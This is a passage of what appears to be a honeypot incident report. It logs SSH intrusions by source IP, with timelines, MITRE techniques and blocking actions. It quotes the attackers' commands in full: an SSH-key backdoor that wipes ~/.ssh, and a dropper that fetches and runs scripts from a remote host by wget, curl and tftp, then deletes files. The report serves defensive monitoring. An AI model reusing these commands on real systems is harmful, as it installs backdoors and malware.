| `2026-09-24 17:38:57` | `cowrie.command.input` |
| `2026-09-24 17:38:57` | `cowrie.log.closed` |
| `2026-09-24 17:38:58` | `cowrie.session.params` |
| `2026-09-24 17:38:58` | `cowrie.command.input` |
| `2026-09-24 17:38:58` | `cowrie.log.closed` |
| `2026-09-24 17:38:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8249985c4a73

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-09-24 17:40 |
| **Last Seen** | 2026-09-24 17:41 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 17:40:59` | `cowrie.session.connect` |
| `2026-09-24 17:40:59` | `cowrie.client.version` |
| `2026-09-24 17:40:59` | `cowrie.client.kex` |
| `2026-09-24 17:41:00` | `cowrie.login.success` |
| `2026-09-24 17:41:01` | `cowrie.session.params` |
| `2026-09-24 17:41:01` | `cowrie.command.input` |
| `2026-09-24 17:41:01` | `cowrie.command.input` |
| `2026-09-24 17:41:01` | `cowrie.command.input` |
| `2026-09-24 17:41:01` | `cowrie.command.input` |
| `2026-09-24 17:41:01` | `cowrie.command.input` |
| `2026-09-24 17:41:01` | `cowrie.command.success` |
| `2026-09-24 17:41:01` | `cowrie.command.input` |
| `2026-09-24 17:41:01` | `cowrie.command.input` |
| `2026-09-24 17:41:01` | `cowrie.command.input` |
| `2026-09-24 17:41:01` | `cowrie.command.input` |
| `2026-09-24 17:41:02` | `cowrie.log.closed` |
| `2026-09-24 17:41:02` | `cowrie.session.params` |
| `2026-09-24 17:41:02` | `cowrie.command.input` |
| `2026-09-24 17:41:03` | `cowrie.log.closed` |
| `2026-09-24 17:41:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-19dd01a5840b

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-09-24 17:43 |
| **Last Seen** | 2026-09-24 17:43 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 17:43:37` | `cowrie.session.connect` |
| `2026-09-24 17:43:37` | `cowrie.client.version` |
| `2026-09-24 17:43:37` | `cowrie.client.kex` |
| `2026-09-24 17:43:37` | `cowrie.login.success` |
| `2026-09-24 17:43:38` | `cowrie.session.params` |
| `2026-09-24 17:43:38` | `cowrie.command.input` |
| `2026-09-24 17:43:38` | `cowrie.command.input` |
| `2026-09-24 17:43:38` | `cowrie.command.input` |
| `2026-09-24 17:43:38` | `cowrie.command.input` |
| `2026-09-24 17:43:38` | `cowrie.command.input` |
| `2026-09-24 17:43:38` | `cowrie.command.success` |
| `2026-09-24 17:43:38` | `cowrie.command.input` |
| `2026-09-24 17:43:38` | `cowrie.command.input` |
| `2026-09-24 17:43:38` | `cowrie.command.input` |
| `2026-09-24 17:43:38` | `cowrie.command.input` |
| `2026-09-24 17:43:39` | `cowrie.log.closed` |
| `2026-09-24 17:43:40` | `cowrie.session.params` |
| `2026-09-24 17:43:40` | `cowrie.command.input` |
| `2026-09-24 17:43:40` | `cowrie.log.closed` |
| `2026-09-24 17:43:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cccbb5a132d2

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-09-24 17:46 |
| **Last Seen** | 2026-09-24 17:46 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 17:46:52` | `cowrie.session.connect` |
| `2026-09-24 17:46:52` | `cowrie.client.version` |
| `2026-09-24 17:46:52` | `cowrie.client.kex` |
| `2026-09-24 17:46:53` | `cowrie.login.success` |
| `2026-09-24 17:46:54` | `cowrie.session.params` |
| `2026-09-24 17:46:54` | `cowrie.command.input` |
| `2026-09-24 17:46:54` | `cowrie.command.input` |
| `2026-09-24 17:46:54` | `cowrie.command.input` |
| `2026-09-24 17:46:54` | `cowrie.command.input` |
| `2026-09-24 17:46:54` | `cowrie.command.input` |
| `2026-09-24 17:46:54` | `cowrie.command.success` |
| `2026-09-24 17:46:54` | `cowrie.command.input` |
| `2026-09-24 17:46:54` | `cowrie.command.input` |
| `2026-09-24 17:46:54` | `cowrie.command.input` |
| `2026-09-24 17:46:54` | `cowrie.command.input` |
| `2026-09-24 17:46:54` | `cowrie.log.closed` |
| `2026-09-24 17:46:55` | `cowrie.session.params` |
| `2026-09-24 17:46:55` | `cowrie.command.input` |
| `2026-09-24 17:46:56` | `cowrie.log.closed` |
| `2026-09-24 17:46:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3ecc2d8468fb

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-09-24 17:49 |
| **Last Seen** | 2026-09-24 17:49 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 17:49:32` | `cowrie.session.connect` |
| `2026-09-24 17:49:32` | `cowrie.client.version` |
| `2026-09-24 17:49:32` | `cowrie.client.kex` |
| `2026-09-24 17:49:32` | `cowrie.login.success` |
| `2026-09-24 17:49:33` | `cowrie.session.params` |
| `2026-09-24 17:49:33` | `cowrie.command.input` |
| `2026-09-24 17:49:33` | `cowrie.command.input` |
| `2026-09-24 17:49:33` | `cowrie.command.input` |
| `2026-09-24 17:49:33` | `cowrie.command.input` |
| `2026-09-24 17:49:33` | `cowrie.command.input` |
| `2026-09-24 17:49:33` | `cowrie.command.success` |
| `2026-09-24 17:49:33` | `cowrie.command.input` |
| `2026-09-24 17:49:33` | `cowrie.command.input` |
| `2026-09-24 17:49:33` | `cowrie.command.input` |
| `2026-09-24 17:49:33` | `cowrie.command.input` |
| `2026-09-24 17:49:33` | `cowrie.log.closed` |
| `2026-09-24 17:49:34` | `cowrie.session.params` |
| `2026-09-24 17:49:34` | `cowrie.command.input` |
| `2026-09-24 17:49:34` | `cowrie.log.closed` |
| `2026-09-24 17:49:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-09468c56240e

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-09-24 17:52 |
| **Last Seen** | 2026-09-24 17:52 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 17:52:46` | `cowrie.session.connect` |
| `2026-09-24 17:52:46` | `cowrie.client.version` |
| `2026-09-24 17:52:46` | `cowrie.client.kex` |
| `2026-09-24 17:52:47` | `cowrie.login.success` |
| `2026-09-24 17:52:48` | `cowrie.session.params` |
| `2026-09-24 17:52:48` | `cowrie.command.input` |
| `2026-09-24 17:52:48` | `cowrie.command.input` |
| `2026-09-24 17:52:48` | `cowrie.command.input` |
| `2026-09-24 17:52:48` | `cowrie.command.input` |
| `2026-09-24 17:52:48` | `cowrie.command.input` |
| `2026-09-24 17:52:48` | `cowrie.command.success` |
| `2026-09-24 17:52:48` | `cowrie.command.input` |
| `2026-09-24 17:52:48` | `cowrie.command.input` |
| `2026-09-24 17:52:48` | `cowrie.command.input` |
| `2026-09-24 17:52:48` | `cowrie.command.input` |
| `2026-09-24 17:52:48` | `cowrie.log.closed` |
| `2026-09-24 17:52:49` | `cowrie.session.params` |
| `2026-09-24 17:52:49` | `cowrie.command.input` |
| `2026-09-24 17:52:49` | `cowrie.log.closed` |
| `2026-09-24 17:52:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-196122c40dd9

| Field | Detail |
|---|---|
| **Source IP** | `23.227.147[.]163` |
| **First Seen** | 2026-09-24 17:58 |
| **Last Seen** | 2026-09-24 17:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 17:58:23` | `cowrie.session.connect` |
| `2026-09-24 17:58:23` | `cowrie.client.version` |
| `2026-09-24 17:58:23` | `cowrie.client.kex` |
| `2026-09-24 17:58:23` | `cowrie.login.success` |
| `2026-09-24 17:58:24` | `cowrie.session.params` |
| `2026-09-24 17:58:24` | `cowrie.command.input` |
| `2026-09-24 17:58:24` | `cowrie.command.failed` |
| `2026-09-24 17:58:24` | `cowrie.log.closed` |
| `2026-09-24 17:58:25` | `cowrie.session.params` |
| `2026-09-24 17:58:25` | `cowrie.command.input` |
| `2026-09-24 17:58:25` | `cowrie.session.file_download` |
| `2026-09-24 17:58:25` | `cowrie.log.closed` |
| `2026-09-24 17:58:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `23.227.147[.]163` to AbuseIPDB if not already reported
- [ ] Block `23.227.147[.]163` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c950edd96a45

| Field | Detail |
|---|---|
| **Source IP** | `23.227.147[.]163` |
| **First Seen** | 2026-09-24 17:58 |
| **Last Seen** | 2026-09-24 17:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 17:58:25` | `cowrie.session.connect` |
| `2026-09-24 17:58:25` | `cowrie.client.version` |
| `2026-09-24 17:58:25` | `cowrie.client.kex` |
| `2026-09-24 17:58:25` | `cowrie.login.success` |
| `2026-09-24 17:58:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `23.227.147[.]163` to AbuseIPDB if not already reported
- [ ] Block `23.227.147[.]163` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6dc1c3d5e780

| Field | Detail |
|---|---|
| **Source IP** | `23.227.147[.]163` |
| **First Seen** | 2026-09-24 17:58 |
| **Last Seen** | 2026-09-24 17:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 17:58:25` | `cowrie.session.connect` |
| `2026-09-24 17:58:25` | `cowrie.client.version` |
| `2026-09-24 17:58:25` | `cowrie.client.kex` |
| `2026-09-24 17:58:25` | `cowrie.login.success` |
| `2026-09-24 17:58:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `23.227.147[.]163` to AbuseIPDB if not already reported
- [ ] Block `23.227.147[.]163` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e27dbcb0614c

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]69` |
| **First Seen** | 2026-09-24 18:23 |
| **Last Seen** | 2026-09-24 18:24 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh, cd /tmp || cd /run || cd /mnt || cd /root || cd /; wget hxxp://213.232.114[.]14/nokillbins/handshakebins.sh; busybox wget hxxp://213.232.114[.]14/nokillbins/handshakebins.sh; curl -o handshakebins.sh hxxp://213.232.114[.]14/nokillbins/handshakebins.sh; chmod 777 handshakebins.sh; sh handshakebins.sh; tftp 213.232.114[.]14 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 213.232.114[.]14; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf handshakebins.sh tftp1.sh tftp2.sh; rm -rf *` |
| **Download Attempts** | hxxp://213.232.114[.]14/nokillbins/handshakebins.sh, hxxp://213.232.114[.]14/nokillbins/handshakebins.sh, hxxp://213.232.114[.]14/nokillbins/handshakebins.sh |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 18:23:50` | `cowrie.session.connect` |
| `2026-09-24 18:23:50` | `cowrie.login.success` |
| `2026-09-24 18:23:50` | `cowrie.session.params` |
| `2026-09-24 18:23:52` | `cowrie.command.input` |
| `2026-09-24 18:23:52` | `cowrie.command.input` |
| `2026-09-24 18:23:52` | `cowrie.session.file_download` |
| `2026-09-24 18:23:52` | `cowrie.session.file_download` |
| `2026-09-24 18:23:52` | `cowrie.session.file_download` |
| `2026-09-24 18:23:53` | `cowrie.session.file_download` |
| `2026-09-24 18:23:53` | `cowrie.session.file_download.failed` |
| `2026-09-24 18:23:53` | `cowrie.session.file_download` |
| `2026-09-24 18:23:53` | `cowrie.session.file_download` |
| `2026-09-24 18:24:07` | `cowrie.log.closed` |
| `2026-09-24 18:24:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]69` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]69` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-02a82daa2393

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-09-24 18:23 |
| **Last Seen** | 2026-09-24 18:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 18:23:58` | `cowrie.session.connect` |
| `2026-09-24 18:23:58` | `cowrie.client.version` |
| `2026-09-24 18:23:58` | `cowrie.client.kex` |
| `2026-09-24 18:23:59` | `cowrie.login.success` |
| `2026-09-24 18:23:59` | `cowrie.direct-tcpip.request` |
| `2026-09-24 18:23:59` | `cowrie.direct-tcpip.data` |
| `2026-09-24 18:23:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-56c7c285e995

| Field | Detail |
|---|---|
| **Source IP** | `77.90.185[.]17` |
| **First Seen** | 2026-09-24 18:30 |
| **Last Seen** | 2026-09-24 18:31 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 18:30:59` | `cowrie.session.connect` |
| `2026-09-24 18:30:59` | `cowrie.client.version` |
| `2026-09-24 18:30:59` | `cowrie.client.kex` |
| `2026-09-24 18:30:59` | `cowrie.login.success` |
| `2026-09-24 18:31:01` | `cowrie.direct-tcpip.request` |
| `2026-09-24 18:31:01` | `cowrie.direct-tcpip.ja4` |
| `2026-09-24 18:31:01` | `cowrie.direct-tcpip.data` |
| `2026-09-24 18:31:01` | `cowrie.direct-tcpip.request` |
| `2026-09-24 18:31:01` | `cowrie.direct-tcpip.ja4` |
| `2026-09-24 18:31:01` | `cowrie.direct-tcpip.data` |
| `2026-09-24 18:31:01` | `cowrie.direct-tcpip.request` |
| `2026-09-24 18:31:03` | `cowrie.direct-tcpip.ja4` |
| `2026-09-24 18:31:03` | `cowrie.direct-tcpip.data` |
| `2026-09-24 18:31:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.90.185[.]17` to AbuseIPDB if not already reported
- [ ] Block `77.90.185[.]17` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

```
⚠️  MALWARE ANALYSIS — HIGH SEVERITY SAMPLE DETECTED
   File  : 07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656  (ELF Binary (Linux executable))
   SHA256: 07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aa...
   Score : 86/100  |  VT: 40/75
   ↳ Download via wget: wget
   ↳ Download via curl: curl
   ↳ Execution from /tmp: /tmp/bot
   ↳ chmod +x (make executable): chmod +x
```

### 🔴 HIGH · IR-47faec7ec2fb

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]69` |
| **First Seen** | 2026-09-24 18:32 |
| **Last Seen** | 2026-09-24 18:32 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh, cd /tmp || cd /run || cd /mnt || cd /root || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh; busybox wget hxxp://213.232.114[.]14/handshakebins.sh; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh; chmod 777 handshakebins.sh; sh handshakebins.sh; tftp 213.232.114[.]14 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 213.232.114[.]14; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf handshakebins.sh tftp1.sh tftp2.sh; rm -rf *` |
| **Download Attempts** | hxxp://213.232.114[.]14/handshakebins.sh, hxxp://213.232.114[.]14/handshakebins.sh, hxxp://213.232.114[.]14/handshakebins.sh |
| **Malware Analysis** | 07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656 (HIGH) |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 18:32:20` | `cowrie.session.connect` |
| `2026-09-24 18:32:20` | `cowrie.login.success` |
| `2026-09-24 18:32:21` | `cowrie.session.params` |
| `2026-09-24 18:32:22` | `cowrie.command.input` |
| `2026-09-24 18:32:22` | `cowrie.command.input` |
| `2026-09-24 18:32:22` | `cowrie.session.file_download` |
| `2026-09-24 18:32:23` | `cowrie.session.file_download` |
| `2026-09-24 18:32:23` | `cowrie.session.file_download` |
| `2026-09-24 18:32:23` | `cowrie.session.file_download` |
| `2026-09-24 18:32:23` | `cowrie.session.file_download.failed` |
| `2026-09-24 18:32:23` | `cowrie.session.file_download` |
| `2026-09-24 18:32:24` | `cowrie.session.file_download` |
| `2026-09-24 18:32:37` | `cowrie.log.closed` |
| `2026-09-24 18:32:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]69` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]69` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Review VT report: hxxps://www.virustotal.com/gui/file/07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-65f68943ad9d

| Field | Detail |
|---|---|
| **Source IP** | `77.90.185[.]17` |
| **First Seen** | 2026-09-24 18:33 |
| **Last Seen** | 2026-09-24 18:33 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 18:33:43` | `cowrie.session.connect` |
| `2026-09-24 18:33:43` | `cowrie.client.version` |
| `2026-09-24 18:33:43` | `cowrie.client.kex` |
| `2026-09-24 18:33:43` | `cowrie.login.success` |
| `2026-09-24 18:33:44` | `cowrie.direct-tcpip.request` |
| `2026-09-24 18:33:45` | `cowrie.direct-tcpip.ja4` |
| `2026-09-24 18:33:45` | `cowrie.direct-tcpip.data` |
| `2026-09-24 18:33:45` | `cowrie.direct-tcpip.request` |
| `2026-09-24 18:33:46` | `cowrie.direct-tcpip.ja4` |
| `2026-09-24 18:33:46` | `cowrie.direct-tcpip.data` |
| `2026-09-24 18:33:46` | `cowrie.direct-tcpip.request` |
| `2026-09-24 18:33:46` | `cowrie.direct-tcpip.ja4` |
| `2026-09-24 18:33:46` | `cowrie.direct-tcpip.data` |
| `2026-09-24 18:33:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.90.185[.]17` to AbuseIPDB if not already reported
- [ ] Block `77.90.185[.]17` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `115.245.185[.]82` | **30** | 2026-09-24 13:09 | 2026-09-24 14:10 | 11m | 0 | `T1592` | 🟠 MEDIUM |
| `193.112.192[.]91` | **7** | 2026-09-24 14:27 | 2026-09-24 14:30 | 8m | 0 | `T1592` | 🟢 LOW |
| `137.184.5[.]188` | **5** | 2026-09-24 13:15 | 2026-09-24 15:22 | 3m | 0 | `T1592` | 🟢 LOW |
| `222.100.0[.]151` | **5** | 2026-09-24 13:27 | 2026-09-24 14:27 | 1m | 0 | `T1592` | 🟢 LOW |
| `172.235.40[.]131` | **3** | 2026-09-24 14:35 | 2026-09-24 14:35 | 0m | 0 | `T1592` | 🟢 LOW |
| `185.112.33[.]84` | **3** | 2026-09-24 16:27 | 2026-09-24 16:32 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `66.132.195[.]103` | **3** | 2026-09-24 12:56 | 2026-09-24 12:57 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.224[.]238` | **3** | 2026-09-24 12:55 | 2026-09-24 12:56 | 0m | 0 | `T1592` | 🟢 LOW |
| `132.148.30[.]167` | **2** | 2026-09-24 16:54 | 2026-09-24 17:15 | 0m | 0 | `T1592` | 🟢 LOW |
